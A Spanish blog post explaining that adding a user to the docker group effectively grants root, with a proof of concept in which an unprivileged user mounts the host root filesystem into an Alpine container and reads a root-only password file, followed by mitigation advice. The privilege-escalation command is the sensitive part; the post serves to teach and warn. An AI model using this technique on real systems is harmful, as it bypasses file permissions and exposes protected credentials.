---
title: 'Docker puede ser un problema de seguridad en tu sistema'
date: '2022-02-13'
tags: ["Hacking", "Docker", "Vulnerabilities", "#Import 2022-12-20 21:06"]
draft: false
authors: ['default']
summary: 'En este art√≠culo, exploramos el problema de seguridad que surge al utilizar Docker. Aunque Docker ha revolucionado la forma en que creamos y compartimos im√°genes de contenedores, uno de los problemas que se le atribuye es que el proceso de Docker Daemon se ejecuta como Root. Esto puede tener implicaciones indirectas y comprometer la seguridad de nuestro sistema. A trav√©s de una prueba de concepto, demostramos c√≥mo un usuario sin privilegios puede acceder a archivos protegidos por root dentro de un contenedor Docker. Es importante tener en cuenta estas consideraciones de seguridad al utilizar Docker y tomar medidas adecuadas para proteger nuestro sistema.'
images: ["/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/docker.webp", "/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-23.webp", "/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-24.webp"]
---

![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/docker.webp)

Docker naci√≥ (o mejor dicho, fue presentado al p√∫blico) en la PyCon de 2013 en una charla titulada *"The future of Linux Containers"*. Recomiendo ver el video que aparece a continuaci√≥n (son menos de 6 minutos) y disfrutar del hecho de que en la inform√°tica, estamos viviendo lo que en un futuro ser√° la "historia del desarrollo de software".

Y es que los *Albert Einstein* del software como *[Linus Torvalds](https://es.wikipedia.org/wiki/Linus_Torvalds), [Robert C. Martin](https://es.wikipedia.org/wiki/Robert_C._Martin), [Martin Fowler](https://martinfowler.com/), [Guido Van Rossum](https://es.wikipedia.org/wiki/Guido_van_Rossum)* o muchos de los inventores de lenguajes de programaci√≥n que se encuentran en el 99% del software que utilizamos, est√°n vivos a d√≠a de hoy.

Pero volviendo al tema de Docker. Docker no trajo consigo la tecnolog√≠a de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde [hace m√°s de 20 a√±os](https://blog.aquasec.com/a-brief-history-of-containers-from-1970s-chroot-to-docker-2016) con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnolog√≠a se empez√≥ a utilizar por la mayor√≠a de la gente.

La verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar im√°genes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no est√° libre de ser juzgado por mucha gente.

**Uno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root.** Y esto trae implicaciones indirectas como veremos a continuaci√≥n.

Cuando instalamos Docker siguiendo el tutorial su [p√°gina oficial](https://docs.docker.com/engine/install/ubuntu/), nos invita a seguir un proceso post-instalaci√≥n en la [siguiente p√°gina](https://docs.docker.com/engine/install/linux-postinstall/) donde nos ense√±an que **podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker**. Y es que aqu√≠ est√° la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es m√°s seguro, cuando eso no cambia nada y de hecho, te da una sensaci√≥n de seguridad que puede resultarte caro como veremos en la prueba de concepto.

Por romper una lanza a favor de ellos, en esa misma p√°gina podemos encontrar el cuadro a continuaci√≥n.

![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-23.webp)

Y es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayor√≠a de los blogs donde nos ense√±an a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario "sin privilegios" en el grupo de Docker. Adem√°s, "eso de Daemon Attack Surface a mi me suena a chino" üòé.

Prueba de concepto
==================

1. Contexto del problema
------------------------

Tenemos 2 usuarios en nuestro sistema, **root** y **demo**.


```
‚îÄ‚îÄ[root@parrot]‚îÄ[/root]‚îÄ‚îÄ# id
uid=0(root) gid=0(root) grupos=0(root)
```

```
‚îÄ‚îÄ[demo@parrot]‚îÄ[/home/demo]$ id
uid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)
```
Como vemos, demo est√° en el grupo Docker para poder lanzar contenedores y realizar su gesti√≥n. Como demo es un usuario con pocos privilegios, adem√°s, es un poco con el que solemos hacer todo pensando que as√≠ estamos m√°s seguros.

2. El archivo "protegido" de root
---------------------------------

Hay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.


```
‚îÄ‚îÄ[root@parrot]‚îÄ[/home]‚îÄ‚îÄ# ls -l
total 4
drwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo
-r-------- 1 root root  16 Feb 13 21:03 password.txt
drwxr-xr-x 1 user user 614 Feb 13 19:53 user
```
![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-24.webp)

Si no conoces como funcionan los permisos de Linux no pasa nada, simplemente cr√©ete la siguiente afirmaci√≥n de lo que ocurre.

**Ning√∫n otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.**

Si a√∫n as√≠ intentamos leer su contenido con el usuario demo, vemos el siguiente error.


```
‚îÄ‚îÄ[demo@parrot]‚îÄ[~/demo]‚îÄ‚îÄ‚îÄ$ cat /home/password.txt 
cat: /home/password.txt: Permiso denegado
```
Hasta aqu√≠ todo bien, ¬øcorrecto?

3. Docker Daemon Attack Surface
-------------------------------

A continuaci√≥n, el usuario demo, el que no ten√≠a privilegios, el que no pod√≠a leer el contenido de root, crea un contenedor del siguiente modo.


```
‚îÄ‚îÄ[demo@parrot]‚îÄ[~/demo]‚îÄ‚îÄ‚îÄ$ docker run -v /:/vulnerable -it alpine /bin/sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
59bf1c3509f3: Pull complete 
Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
Status: Downloaded newer image for alpine:latest
/ #
```
Y una vez, dentro del contenedor, empieza la magia üßô‚Äç‚ôÇÔ∏è.


```
/ # whoami
root
/ # cat vulnerable/home/password.txt
P0wn3dP@ssw0rd!
```
Es decir, un usuario sin privilegios, fuera del contexto de los contenedores no ten√≠amos acceso a los archivos que root controlaba. 

Dentro del contexto de los contenedores, si mapeamos en un volumen la ra√≠z de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.

4. Conclusi√≥n
-------------

¬øEs el t√≠tulo del post clickbait? En parte s√≠. M√°s que una vulnerabilidad es un problema de no tener las cosas bien configuradas. 

¬øLa p√°gina oficial de Docker podr√≠a explicar el problema o se√±alarlo de una mejor forma? Seguro que tambi√©n.

La realidad es que ellos no tienen la culpa. En su misma p√°gina explican todo esto. Y la realidad tambi√©n es que poca gente es conocedora de este problema de "mala configuraci√≥n". Es responsabilidad de todos hacer pedagog√≠a y explicarles a nuestros compa√±eros los riesgos que acarrea seg√∫n que cosas y yo, con este post, dejo mi granito de arena.

¬øC√≥mo deber√≠as mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Prot√©gelo con una buena contrase√±a y a√≠slalo del resto de cosas que haces en el sistema.

